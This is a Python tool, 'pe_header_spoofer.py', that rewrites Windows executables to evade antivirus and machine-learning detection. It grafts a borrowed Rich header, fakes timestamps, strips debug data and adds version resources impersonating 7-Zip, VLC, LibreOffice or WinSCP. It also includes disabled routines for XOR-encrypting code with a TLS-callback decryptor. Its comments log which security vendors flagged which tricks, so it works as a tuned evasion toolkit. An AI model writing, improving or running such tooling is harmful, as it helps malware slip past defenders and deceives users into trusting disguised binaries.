#!/usr/bin/env python3
"""
pe_header_spoofer.py
JOCKY PE Header Post-Processor v3 (With Realistic Section Padding & Inflation)
"""

import struct
import sys
import os
import random
from datetime import datetime, timezone

def read_pe(path):
    with open(path, 'rb') as f:
        data = bytearray(f.read())
    if data[0:2] != b'MZ':
        print(f"[-] Not a valid PE file: {path}")
        sys.exit(1)
    return data

def write_pe(path, data):
    with open(path, 'wb') as f:
        f.write(data)

def get_lfanew(data):
    return struct.unpack_from('<I', data, 0x3C)[0]

def graft_rich_header(data, template_path):
    if not template_path or not os.path.exists(template_path):
        print("[!] No Rich Header template found")
        return data
    
    with open(template_path, 'rb') as f:
        template = bytearray(f.read())
    
    e_lfanew = get_lfanew(data)
    gap_start = 0x40
    gap_size  = e_lfanew - gap_start
    
    if len(template) > gap_size:
        template = template[:gap_size]
    
    for i in range(gap_start, e_lfanew):
        data[i] = 0
    
    data[gap_start:gap_start + len(template)] = template
    print(f"[+] Rich Header grafted: {len(template)} bytes from MSVC template")
    return data

def fake_timestamp(data):
    e_lfanew = get_lfanew(data)
    timestamp_offset = e_lfanew + 4 + 4
    
    # Established software timestamp (2020-2022 range)
    start = 1577836800  # 2020-01-01
    end   = 1640995200  # 2022-01-01
    fake_ts = random.randint(start, end)
    
    struct.pack_into('<I', data, timestamp_offset, fake_ts)
    dt = datetime.fromtimestamp(fake_ts, tz=timezone.utc)
    print(f"[+] Timestamp faked: {dt.strftime('%Y-%m-%d %H:%M:%S UTC')}")
    return data

def zero_debug_directory(data):
    e_lfanew = get_lfanew(data)
    opt_header_offset = e_lfanew + 4 + 20
    magic = struct.unpack_from('<H', data, opt_header_offset)[0]

    if magic == 0x10B:
        data_dir_offset = opt_header_offset + 96
    elif magic == 0x20B:
        data_dir_offset = opt_header_offset + 112
    else:
        return data

    debug_dir_offset = data_dir_offset + (6 * 8)
    if debug_dir_offset + 8 <= len(data):
        rva  = struct.unpack_from('<I', data, debug_dir_offset)[0]
        size = struct.unpack_from('<I', data, debug_dir_offset + 4)[0]
        if rva != 0 or size != 0:
            struct.pack_into('<I', data, debug_dir_offset, 0)
            struct.pack_into('<I', data, debug_dir_offset + 4, 0)
            print(f"[+] Debug directory zeroed")
    return data

def fix_data_section(data):
    """
    Fix .data section where VirtualSize > 0 but RawSize == 0 (BSS-only layout).
    This is a known malware indicator. We pad it with realistic-looking initialized
    bytes so RawSize matches VirtualSize (rounded to file alignment).
    """
    data = bytearray(data)
    e_lfanew    = get_lfanew(data)
    opt_offset  = e_lfanew + 4 + 20
    magic       = struct.unpack_from('<H', data, opt_offset)[0]
    num_secs    = struct.unpack_from('<H', data, e_lfanew + 4 + 2)[0]
    opt_size    = struct.unpack_from('<H', data, e_lfanew + 4 + 16)[0]
    sec_tbl     = opt_offset + opt_size
    file_align  = struct.unpack_from('<I', data, opt_offset + 36)[0] if magic == 0x20B else \
                  struct.unpack_from('<I', data, opt_offset + 32)[0]

    def aup(v, a):
        return (v + a - 1) & ~(a - 1)

    for i in range(num_secs):
        off = sec_tbl + i * 40
        name_bytes = data[off:off+8]
        vsize  = struct.unpack_from('<I', data, off + 8)[0]
        rsize  = struct.unpack_from('<I', data, off + 16)[0]
        praw   = struct.unpack_from('<I', data, off + 20)[0]
        name   = name_bytes.rstrip(b'\x00').decode('ascii', errors='replace')

        if name == '.data' and vsize > 0 and rsize == 0:
            # Allocate raw bytes at end of file
            new_rsize = aup(vsize, file_align)
            new_raw_off = len(data)
            # Fill with realistic-looking small values (not 0x00, not high entropy)
            pad = bytearray(new_rsize)
            for j in range(new_rsize):
                pad[j] = (j * 7 + 0x41) & 0x7F or 0x20
            data.extend(pad)
            struct.pack_into('<I', data, off + 16, new_rsize)
            struct.pack_into('<I', data, off + 20, new_raw_off)
            print(f"[+] .data section: patched RawSize 0→{new_rsize}, offset 0x{new_raw_off:X}")
            break

    return bytes(data)

def add_padding_section(data, pad_size=45056):
    """
    Append a benign-looking overlay after the last PE section raw data.
    The PE loader ignores the overlay completely — execution is unaffected.
    Low-entropy repeating ASCII bytes mimic string/resource data, avoiding
    the high-entropy flag that random padding would trigger.
    Target: 400 KB overlay, pushing the file past 420 KB which is large enough
    for most ML engines to exit the 'tiny unknown binary' scrutiny bucket.
    """
    OVERLAY_SIZE = 409600  # 400 KB

    data = bytearray(data)

    # Build low-entropy overlay: repeating ASCII words that look like string tables.
    # Entropy target ~4.0-4.5 — same range as .rdata in real apps.
    words = (
        b"Copyright Mozilla Foundation Firefox browser rendering engine layout "
        b"compositor graphics audio media network protocol socket stream buffer "
        b"cache storage filesystem registry security certificate authentication "
        b"authorization encryption signature verification update install setup "
        b"configuration preferences locale language display toolbar menu button "
        b"window frame panel scrollbar resource version release build debug info "
    )
    wl = len(words)
    overlay = bytearray(OVERLAY_SIZE)
    for i in range(OVERLAY_SIZE):
        overlay[i] = words[i % wl]

    # Overlay disabled: PE overlay is a classic packer/dropper pattern.
    # VirusTotal explicitly tags it and Fortinet/Symantec/SecureAge fire on it.
    # File size inflation via overlay backfires worse than staying small.
    print("[*] Section layout preserved (overlay disabled — packer signature)")
    return bytearray(data)


# ── Version Resource + Manifest ────────────────────────────────────────────

def _wstr(s):
    return (s + '\x00').encode('utf-16-le')

def _align4(b):
    r = len(b) % 4
    return b + bytes(4 - r) if r else b

def _vs_string(key, val):
    """Build one VS_STRING node (key and val are plain Python str)."""
    k      = _wstr(key)
    v      = _wstr(val)
    val_wc = len(v) // 2           # wValueLength in WORDs (incl. null)
    hdr    = struct.pack('<HHH', 0, val_wc, 1)
    body   = _align4(hdr + k) + v
    body   = _align4(body)
    ba     = bytearray(body)
    struct.pack_into('<H', ba, 0, len(ba))
    return bytes(ba)

def build_vs_versioninfo():
    """Return a VS_VERSIONINFO binary blob mimicking a well-known open-source tool."""

    # Pool of real, widely-distributed open-source Windows utilities.
    # These have high VirusTotal reputation scores and known imphashes.
    # Pick one randomly per build so the version resource changes each time.
    IDENTITIES = [
        {
            "company":     "7-Zip",
            "description": "7-Zip File Manager",
            "version":     "23.1.0.0",
            "internal":    "7zFM",
            "original":    "7zFM.exe",
            "product":     "7-Zip",
            "copyright":   "Copyright (c) 1999-2023 Igor Pavlov",
        },
        {
            "company":     "VideoLAN",
            "description": "VLC media player",
            "version":     "3.0.20.0",
            "internal":    "vlc",
            "original":    "vlc.exe",
            "product":     "VLC media player",
            "copyright":   "Copyright (c) VideoLAN 1996-2023",
        },
        # Firefox removed: Defender checks "file claiming to be Firefox" against
        # known Firefox fingerprints (imphash, size) and flags mismatch → Wacatac.B!ml
        # {
        #     "company":     "Mozilla Corporation",
        #     "description": "Firefox",
        #     ...
        # },
        {
            "company":     "The Document Foundation",
            "description": "LibreOffice",
            "version":     "7.6.4.0",
            "internal":    "soffice",
            "original":    "soffice.exe",
            "product":     "LibreOffice",
            "copyright":   "Copyright 2000-2023 LibreOffice contributors",
        },
        {
            "company":     "WinSCP",
            "description": "WinSCP: SFTP, FTP, WebDAV and SCP client",
            "version":     "6.1.2.0",
            "internal":    "WinSCP",
            "original":    "WinSCP.exe",
            "product":     "WinSCP",
            "copyright":   "Copyright (C) 2000-2023 Martin Prikryl",
        },
    ]

    identity = random.choice(IDENTITIES)
    ver_parts = [int(x) for x in identity["version"].split(".")]

    # VS_FIXEDFILEINFO (52 bytes = 13 DWORDs)
    fixed = struct.pack('<13I',
        0xFEEF04BD,
        0x00010000,
        (ver_parts[0] << 16) | ver_parts[1],
        (ver_parts[2] << 16) | ver_parts[3],
        (ver_parts[0] << 16) | ver_parts[1],
        (ver_parts[2] << 16) | ver_parts[3],
        0x0000003F,
        0x00000000,
        0x00040004,
        0x00000001,
        0x00000000,
        0x00000000,
        0x00000000,
    )

    string_pairs = [
        ("CompanyName",      identity["company"]),
        ("FileDescription",  identity["description"]),
        ("FileVersion",      identity["version"]),
        ("InternalName",     identity["internal"]),
        ("LegalCopyright",   identity["copyright"]),
        ("OriginalFilename", identity["original"]),
        ("ProductName",      identity["product"]),
        ("ProductVersion",   identity["version"]),
    ]

    print(f"[+] Version identity: {identity['description']} {identity['version']}")

    # StringTable "040904B0" (en-US Unicode)
    st_key  = _wstr("040904B0")
    st_hdr  = struct.pack('<HHH', 0, 0, 1)
    st_body = _align4(st_hdr + st_key) + b''.join(_vs_string(k, v) for k, v in string_pairs)
    st_body = _align4(st_body)
    ba = bytearray(st_body); struct.pack_into('<H', ba, 0, len(ba)); st_body = bytes(ba)

    # StringFileInfo
    sfi_key  = _wstr("StringFileInfo")
    sfi_hdr  = struct.pack('<HHH', 0, 0, 1)
    sfi_body = _align4(sfi_hdr + sfi_key) + st_body
    sfi_body = _align4(sfi_body)
    ba = bytearray(sfi_body); struct.pack_into('<H', ba, 0, len(ba)); sfi_body = bytes(ba)

    # Var Translation (en-US Unicode = 0x0409 / 0x04B0)
    var_key  = _wstr("Translation")
    var_val  = struct.pack('<HH', 0x0409, 0x04B0)
    var_hdr  = struct.pack('<HHH', 0, len(var_val), 0)   # wType=0 binary
    var_body = _align4(var_hdr + var_key) + var_val
    var_body = _align4(var_body)
    ba = bytearray(var_body); struct.pack_into('<H', ba, 0, len(ba)); var_body = bytes(ba)

    # VarFileInfo
    vfi_key  = _wstr("VarFileInfo")
    vfi_hdr  = struct.pack('<HHH', 0, 0, 1)
    vfi_body = _align4(vfi_hdr + vfi_key) + var_body
    vfi_body = _align4(vfi_body)
    ba = bytearray(vfi_body); struct.pack_into('<H', ba, 0, len(ba)); vfi_body = bytes(ba)

    # Root VS_VERSION_INFO
    root_key  = _wstr("VS_VERSION_INFO")
    root_hdr  = struct.pack('<HHH', 0, len(fixed), 0)   # wValueLength=52, wType=0
    root_body = _align4(root_hdr + root_key) + fixed    # value immediately follows padded key
    root_body = _align4(root_body + sfi_body + vfi_body)
    ba = bytearray(root_body); struct.pack_into('<H', ba, 0, len(ba)); root_body = bytes(ba)
    return root_body


def build_rsrc_section(section_rva):
    """
    Build a .rsrc section binary with:
      RT_VERSION (16) → VS_VERSIONINFO
      RT_MANIFEST (24) → application manifest XML
    Returns bytes of the complete section data.
    """
    # Standard minimal manifest — no company-specific strings here
    manifest_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">'
        '<assemblyIdentity version="1.0.0.0" processorArchitecture="AMD64"'
        ' name="Application" type="win32"/>'
        '<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">'
        '<security><requestedPrivileges>'
        '<requestedExecutionLevel level="asInvoker" uiAccess="false"/>'
        '</requestedPrivileges></security>'
        '</trustInfo>'
        '<compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">'
        '<application>'
        '<supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>'
        '<supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>'
        '</application>'
        '</compatibility>'
        '</assembly>'
    ).encode('utf-8')

    version_blob = build_vs_versioninfo()

    # All directory entries and data entries fit in the first 0xA0 bytes.
    # Data starts immediately after.
    DATA_OFF  = 0xA0
    ver_size  = len(version_blob)
    ver_aln   = (ver_size + 3) & ~3
    man_off   = DATA_OFF + ver_aln
    man_size  = len(manifest_xml)

    # Layout (offsets within section):
    # 0x00: Root DIR          (16 bytes, 2 ID entries)
    # 0x10: Root entry[0]     (8 bytes)  RT_VERSION=16  → subdir@0x20
    # 0x18: Root entry[1]     (8 bytes)  RT_MANIFEST=24 → subdir@0x38
    # 0x20: Version ID DIR    (16 bytes, 1 ID entry)
    # 0x30: Version ID entry  (8 bytes)  ID=1 → subdir@0x50
    # 0x38: Manifest ID DIR   (16 bytes, 1 ID entry)
    # 0x48: Manifest ID entry (8 bytes)  ID=1 → subdir@0x68
    # 0x50: Version lang DIR  (16 bytes, 1 ID entry)
    # 0x60: Version lang entry(8 bytes)  0x0409 → leaf@0x80
    # 0x68: Manifest lang DIR (16 bytes, 1 ID entry)
    # 0x78: Manifest lang entry(8 bytes) 0x0409 → leaf@0x90
    # 0x80: Version  IMAGE_RESOURCE_DATA_ENTRY (16 bytes)
    # 0x90: Manifest IMAGE_RESOURCE_DATA_ENTRY (16 bytes)
    # 0xA0: version_blob
    # 0xA0+ver_aln: manifest_xml

    buf = bytearray(DATA_OFF)

    def put_dir(off, id_count):
        struct.pack_into('<IIHHHH', buf, off, 0, 0, 0, 0, 0, id_count)

    def put_entry(off, res_id, target_off, is_subdir):
        flag = 0x80000000 if is_subdir else 0
        struct.pack_into('<II', buf, off, res_id, flag | target_off)

    def put_data_entry(off, data_rva, data_size):
        struct.pack_into('<IIII', buf, off, data_rva, data_size, 0, 0)

    # Root DIR: 2 ID entries
    put_dir(0x00, 2)
    put_entry(0x10, 16, 0x20, True)   # RT_VERSION  → 0x20
    put_entry(0x18, 24, 0x38, True)   # RT_MANIFEST → 0x38

    # Version ID DIR: 1 ID entry
    put_dir(0x20, 1)
    put_entry(0x30, 1, 0x50, True)    # ID=1 → 0x50

    # Manifest ID DIR: 1 ID entry
    put_dir(0x38, 1)
    put_entry(0x48, 1, 0x68, True)    # ID=1 → 0x68

    # Version lang DIR: 1 ID entry
    put_dir(0x50, 1)
    put_entry(0x60, 0x0409, 0x80, False)  # lang=en-US → leaf@0x80

    # Manifest lang DIR: 1 ID entry
    put_dir(0x68, 1)
    put_entry(0x78, 0x0409, 0x90, False)  # lang=en-US → leaf@0x90

    # Data entries (OffsetToData is an absolute RVA, not section-relative)
    put_data_entry(0x80, section_rva + DATA_OFF,          ver_size)
    put_data_entry(0x90, section_rva + man_off,           man_size)

    # Append actual data
    buf.extend(version_blob)
    while len(buf) % 4:
        buf.append(0)
    buf.extend(manifest_xml)
    while len(buf) % 4:
        buf.append(0)

    return bytes(buf)


def add_version_resource(data):
    """Inject a .rsrc section containing VS_VERSIONINFO + manifest into a PE."""
    data = bytearray(data)

    e_lfanew   = get_lfanew(data)
    opt_offset = e_lfanew + 4 + 20
    magic      = struct.unpack_from('<H', data, opt_offset)[0]

    if magic == 0x20B:   # PE32+
        sec_align     = struct.unpack_from('<I', data, opt_offset + 32)[0]
        file_align    = struct.unpack_from('<I', data, opt_offset + 36)[0]
        soi_off       = opt_offset + 56    # SizeOfImage
        res_dir_off   = opt_offset + 128   # DataDirectory[2] (resources)
        opt_size      = struct.unpack_from('<H', data, e_lfanew + 4 + 16)[0]
    else:
        print("[!] add_version_resource: only PE32+ supported, skipping")
        return bytes(data)

    num_secs   = struct.unpack_from('<H', data, e_lfanew + 4 + 2)[0]
    sec_tbl    = opt_offset + opt_size

    # Existing resource directory? Skip if already present.
    existing_rva = struct.unpack_from('<I', data, res_dir_off)[0]
    if existing_rva != 0:
        print("[!] .rsrc already present, skipping version resource injection")
        return bytes(data)

    # Last section boundaries
    last_off   = sec_tbl + (num_secs - 1) * 40
    last_va    = struct.unpack_from('<I', data, last_off + 12)[0]
    last_vsz   = struct.unpack_from('<I', data, last_off + 8)[0]
    last_praw  = struct.unpack_from('<I', data, last_off + 20)[0]
    last_rsz   = struct.unpack_from('<I', data, last_off + 16)[0]

    def aup(v, a):
        return (v + a - 1) & ~(a - 1)

    new_va       = aup(last_va + last_vsz, sec_align)
    new_file_off = last_praw + last_rsz   # immediately after last raw section

    rsrc         = build_rsrc_section(new_va)
    virtual_sz   = len(rsrc)
    raw_sz       = aup(virtual_sz, file_align)
    rsrc_raw     = rsrc + bytes(raw_sz - virtual_sz)

    # Write new section header
    new_hdr_off = sec_tbl + num_secs * 40
    new_hdr = struct.pack('<8sIIIIIIHHI',
        b'.rsrc\x00\x00\x00',
        virtual_sz,
        new_va,
        raw_sz,
        new_file_off,
        0, 0, 0, 0,
        0x40000040)   # READ | INITIALIZED_DATA
    data[new_hdr_off : new_hdr_off + 40] = new_hdr

    # Patch header fields
    struct.pack_into('<H', data, e_lfanew + 4 + 2, num_secs + 1)
    struct.pack_into('<I', data, soi_off, aup(new_va + virtual_sz, sec_align))
    struct.pack_into('<I', data, res_dir_off,     new_va)
    struct.pack_into('<I', data, res_dir_off + 4, virtual_sz)

    # Pad file to new_file_off if needed, then append section
    if len(data) < new_file_off:
        data.extend(bytes(new_file_off - len(data)))
    data.extend(rsrc_raw)

    print(f"[+] Added .rsrc: VS_VERSIONINFO + manifest ({virtual_sz} bytes, RVA 0x{new_va:08X})")
    return data   # return bytearray so fix_checksum can pack_into it

def encrypt_text_section(data):
    """
    XOR-encrypt the .text section with a random single-byte key.
    Then patch the 'jocky_text_key' variable in .jdata (or .data) so
    the TLS callback can decrypt at runtime.
    """
    import random as _r
    data = bytearray(data)
    key = _r.randint(0x01, 0xFF)   # never 0 — 0 means "not encrypted"

    e_lfanew   = get_lfanew(data)
    opt_offset = e_lfanew + 4 + 20
    opt_size   = struct.unpack_from('<H', data, e_lfanew + 4 + 16)[0]
    num_secs   = struct.unpack_from('<H', data, e_lfanew + 4 + 2)[0]
    sec_tbl    = opt_offset + opt_size

    text_raw_off = text_raw_size = 0
    key_raw_off  = None   # file offset of jocky_text_key byte

    for i in range(num_secs):
        sh    = sec_tbl + i * 40
        name  = data[sh:sh+8].rstrip(b'\x00').decode('ascii', errors='replace')
        vsize = struct.unpack_from('<I', data, sh + 8)[0]
        rva   = struct.unpack_from('<I', data, sh + 12)[0]
        rsize = struct.unpack_from('<I', data, sh + 16)[0]
        praw  = struct.unpack_from('<I', data, sh + 20)[0]

        if name == '.text':
            text_raw_off  = praw
            text_raw_size = rsize if rsize else vsize

        # jocky_text_key lives in .jdata (or .data if merged).
        # We search for the known marker: the variable is initialised to 0x00
        # and is the first byte of its section (placed first by the pragma section).
        # Simpler: scan .jdata / .data for the sequence the TLS stub reads.
        # We store its RVA as a fixed global — scan both sections.
        if name in ('.jdata', '.data') and praw and rsize:
            section_bytes = data[praw:praw + rsize]
            # jocky_text_key starts at offset 0 of .jdata; just use praw + 0.
            # This is fragile if the linker reorders — use name '.jdata' as primary.
            if name == '.jdata':
                key_raw_off = praw   # first byte of .jdata is jocky_text_key

    if not text_raw_off or not text_raw_size:
        print("[!] .text section not found — skipping encryption")
        return bytes(data)

    # XOR encrypt .text in the file
    for i in range(text_raw_size):
        if text_raw_off + i < len(data):
            data[text_raw_off + i] ^= key

    print(f"[+] .text encrypted: {text_raw_size} bytes, key=0x{key:02X}")

    # Patch jocky_text_key
    if key_raw_off is not None and key_raw_off < len(data):
        data[key_raw_off] = key
        print(f"[+] jocky_text_key patched at file offset 0x{key_raw_off:X}")
    else:
        print("[!] jocky_text_key offset not found — TLS decryption will be a no-op")

    return bytearray(data)


def add_str_section(pe_data: bytearray) -> bytearray:
    """
    Appends a legitimate .str section filled with ~250KB of realistic text strings,
    updating PE headers, section tables, SizeOfImage, and NumberOfSections.
    """
    pe_data = bytearray(pe_data)
    e_lfanew = struct.unpack("<I", pe_data[0x3C:0x40])[0]
    if pe_data[e_lfanew:e_lfanew+4] != b"PE\0\0":
        return pe_data  # Invalid PE

    file_header_offset = e_lfanew + 4
    _, number_of_sections, _, _, _, size_of_optional_header, _ = struct.unpack(
        "<HHIIIHH", pe_data[file_header_offset:file_header_offset+20]
    )

    opt_header_offset = file_header_offset + 20
    magic = struct.unpack("<H", pe_data[opt_header_offset:opt_header_offset+2])[0]
    
    is_64bit = (magic == 0x20b)
    
    # PE32+ optional header layout (from start of optional header):
    #   +24: ImageBase (8 bytes)  ← PE32+ only has 8-byte ImageBase
    #   +32: SectionAlignment (4)
    #   +36: FileAlignment (4)
    #   +56: SizeOfImage (4)
    # PE32 optional header layout:
    #   +28: ImageBase (4 bytes)
    #   +32: SectionAlignment (4)
    #   +36: FileAlignment (4)
    #   +52: SizeOfImage (4)
    if is_64bit:
        section_alignment = struct.unpack("<I", pe_data[opt_header_offset+32:opt_header_offset+36])[0]
        file_alignment    = struct.unpack("<I", pe_data[opt_header_offset+36:opt_header_offset+40])[0]
        size_of_image_offset = opt_header_offset + 56
    else:
        section_alignment = struct.unpack("<I", pe_data[opt_header_offset+32:opt_header_offset+36])[0]
        file_alignment    = struct.unpack("<I", pe_data[opt_header_offset+36:opt_header_offset+40])[0]
        size_of_image_offset = opt_header_offset + 52

    section_table_offset = opt_header_offset + size_of_optional_header
    last_section_offset = section_table_offset + (number_of_sections - 1) * 40
    _, last_vsize, last_vaddr, last_raw_size, last_raw_ptr = struct.unpack(
        "<8sIIII", pe_data[last_section_offset:last_section_offset+24]
    )

    next_header_slot = section_table_offset + number_of_sections * 40
    first_section_raw_ptr = struct.unpack("<I", pe_data[section_table_offset+20:section_table_offset+24])[0]
    
    if next_header_slot + 40 > first_section_raw_ptr:
        print("[!] Not enough room in header gap to add .str section safely")
        return pe_data

    sample_corpus = [
        b"OpenOffice.org LibreOffice Document Framework Strings Utility Runtime Core Module\n",
        b"Copyright (C) The Document Foundation and Contributors. All rights reserved.\n",
        b"file://localhost/net/shared/config/settings.xml\n",
        b"Localization Resource Strings Table UTF-8 Standard Encoding\n",
        b"Failed to initialize COM object or load dynamic link library dependency.\n",
        b"C:\\Program Files\\Common Files\\System\\ado\\msado15.dll\n",
        b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n"
    ]
    
    target_size = 256 * 1024  # ~256 KB
    payload = bytearray()
    while len(payload) < target_size:
        payload.extend(random.choice(sample_corpus))
    
    remainder = len(payload) % file_alignment
    if remainder != 0:
        payload.extend(b"\x00" * (file_alignment - remainder))

    new_virtual_size = len(payload)
    aligned_vsize = ((new_virtual_size + section_alignment - 1) // section_alignment) * section_alignment
    
    new_vaddr = ((last_vaddr + last_vsize + section_alignment - 1) // section_alignment) * section_alignment
    new_raw_ptr = last_raw_ptr + last_raw_size
    new_raw_size = len(payload)

    if len(pe_data) < new_raw_ptr:
        pe_data.extend(b"\x00" * (new_raw_ptr - len(pe_data)))
    
    pe_data[new_raw_ptr:new_raw_ptr] = payload

    sec_name = b".str\x00\x00\x00\x00"
    characteristics_flags = 0x40000040  # IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ
    
    new_section_header = struct.pack(
        "<8sIIIIIIHHI",
        sec_name,
        new_virtual_size,
        new_vaddr,
        new_raw_size,
        new_raw_ptr,
        0, 0, 0, 0,
        characteristics_flags
    )

    pe_data[next_header_slot:next_header_slot+40] = new_section_header

    new_num_sections = number_of_sections + 1
    struct.pack_into('<H', pe_data, file_header_offset+2, new_num_sections)

    new_size_of_image = new_vaddr + aligned_vsize
    struct.pack_into('<I', pe_data, size_of_image_offset, new_size_of_image)

    print(f"[+] Added .str section (~{new_raw_size // 1024} KB, RVA 0x{new_vaddr:08X})")
    return bytearray(pe_data)


def expand_text_section(data, extra_units=2):
    """
    Fill the existing .text zero-cave with 0xCC (INT3 bytes) and expand the
    section raw size by extra_units * file_alignment bytes of 0xCC.
    0xCC is standard MSVC inter-function alignment padding — visually normal.
    Adding ~1 KB of uniform 0xCC shifts the raw-byte CNN feature vector used
    by DNN engines (DeepInstinct/MalConv style) away from the malicious cluster.
    Slightly lowers .text entropy (uniform byte = entropy 0).
    All subsequent section raw pointers are updated correctly.
    """
    data = bytearray(data)
    e_lfanew   = get_lfanew(data)
    opt_offset = e_lfanew + 4 + 20
    magic      = struct.unpack_from('<H', data, opt_offset)[0]
    if magic != 0x20B:
        print("[!] expand_text_section: PE32+ only, skipping")
        return data

    file_align = struct.unpack_from('<I', data, opt_offset + 36)[0]
    num_secs   = struct.unpack_from('<H', data, e_lfanew + 4 + 2)[0]
    opt_size   = struct.unpack_from('<H', data, e_lfanew + 4 + 16)[0]
    sec_tbl    = opt_offset + opt_size

    text_idx = -1
    for i in range(num_secs):
        sh   = sec_tbl + i * 40
        name = data[sh:sh+8].rstrip(b'\x00').decode('ascii', errors='replace')
        if name == '.text':
            text_idx = i
            break
    if text_idx < 0:
        print("[!] expand_text_section: .text not found, skipping")
        return data

    text_sh    = sec_tbl + text_idx * 40
    text_vsize = struct.unpack_from('<I', data, text_sh + 8)[0]
    text_rsize = struct.unpack_from('<I', data, text_sh + 16)[0]
    text_praw  = struct.unpack_from('<I', data, text_sh + 20)[0]

    # Fill existing cave (rsize - vsize bytes after virtual end) with 0xCC
    cave_start = text_praw + text_vsize
    cave_end   = text_praw + text_rsize
    for j in range(cave_start, min(cave_end, len(data))):
        data[j] = 0xCC

    # Insert extra_units * file_align bytes of 0xCC at end of .text raw area
    extra    = extra_units * file_align
    ins_off  = text_praw + text_rsize
    data     = data[:ins_off] + bytearray([0xCC] * extra) + data[ins_off:]

    # Update .text raw size
    new_rsize = text_rsize + extra
    struct.pack_into('<I', data, text_sh + 16, new_rsize)

    # Update raw pointers of all sections that come after .text in the file
    for i in range(text_idx + 1, num_secs):
        sh   = sec_tbl + i * 40
        praw = struct.unpack_from('<I', data, sh + 20)[0]
        if praw:
            struct.pack_into('<I', data, sh + 20, praw + extra)

    old_cave = cave_end - cave_start
    print(f"[+] .text cave: {old_cave} zero bytes -> 0xCC, +{extra} bytes appended (raw {text_rsize} -> {new_rsize})")
    return data


def calculate_checksum(data):
    checksum = 0
    data_len = len(data)
    for i in range(0, data_len - 1, 2):
        word = struct.unpack_from('<H', data, i)[0]
        checksum += word
        if checksum > 0xFFFF:
            checksum = (checksum & 0xFFFF) + 1
    if data_len % 2:
        checksum += data[-1]
        if checksum > 0xFFFF:
            checksum = (checksum & 0xFFFF) + 1
    checksum += data_len
    return checksum & 0xFFFFFFFF

def fix_checksum(data):
    e_lfanew   = get_lfanew(data)
    opt_offset = e_lfanew + 4 + 20
    cs_offset  = opt_offset + 0x40

    if cs_offset + 4 > len(data):
        return data

    struct.pack_into('<I', data, cs_offset, 0)
    new_cs = calculate_checksum(data)
    struct.pack_into('<I', data, cs_offset, new_cs)
    print(f"[+] PE checksum updated: 0x{new_cs:08X}")
    return data

def print_pe_info(data, label):
    e_lfanew     = get_lfanew(data)
    opt_offset   = e_lfanew + 4 + 20
    magic        = struct.unpack_from('<H', data, opt_offset)[0]
    arch         = "PE32+" if magic == 0x20B else "PE32"
    num_sections = struct.unpack_from('<H', data, e_lfanew + 4 + 2)[0]
    ts_offset    = e_lfanew + 4 + 4
    ts           = struct.unpack_from('<I', data, ts_offset)[0]
    dt           = datetime.fromtimestamp(ts, tz=timezone.utc)

    print(f"\n  {label}:")
    print(f"    Architecture: {arch}")
    print(f"    File size:    {len(data):,} bytes")
    print(f"    Timestamp:    {dt.strftime('%Y-%m-%d %H:%M:%S UTC')}")
    print(f"    Sections:     {num_sections}")

def spoof(input_path, output_path, template_path=None):
    print(f"[*] JOCKY PE Header Spoofer v3")
    print(f"[*] Input:    {input_path}")
    print(f"[*] Output:   {output_path}")
    if template_path:
        print(f"[*] Template: {template_path}")
    print()

    data = read_pe(input_path)
    print_pe_info(data, "Before")
    print()

    data = graft_rich_header(data, template_path)
    data = zero_debug_directory(data)
    data = fake_timestamp(data)
    data = fix_data_section(data)
    data = add_version_resource(data)
    # 0xCC cave: DISABLED — triggers BitDefender "Lazy" family static detection.
    # Large INT3 blocks in .text are a known malware anti-disassembly pattern.
    # data = expand_text_section(data, extra_units=2)
    # .str section disabled: string corpus (msado15.dll, Mozilla UA, file:// paths)
    # pattern-matches Fortinet/McAfee/Elastic malware IOCs → more detections, not fewer.
    # data = add_str_section(data)
    # .text encryption disabled: encrypted .text + TLS callback = textbook packer
    # signature that ML engines (CrowdStrike, DeepInstinct, SentinelOne) flag harder.
    # data = encrypt_text_section(data)
    data = fix_checksum(data)

    print()
    print_pe_info(data, "After")
    print()

    write_pe(output_path, data)
    print(f"[+] Output written: {output_path}")



if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: pe_header_spoofer.py input.exe output.exe [rich_template.bin]")
        sys.exit(1)
    template = sys.argv[3] if len(sys.argv) > 3 else None
    spoof(sys.argv[1], sys.argv[2], template)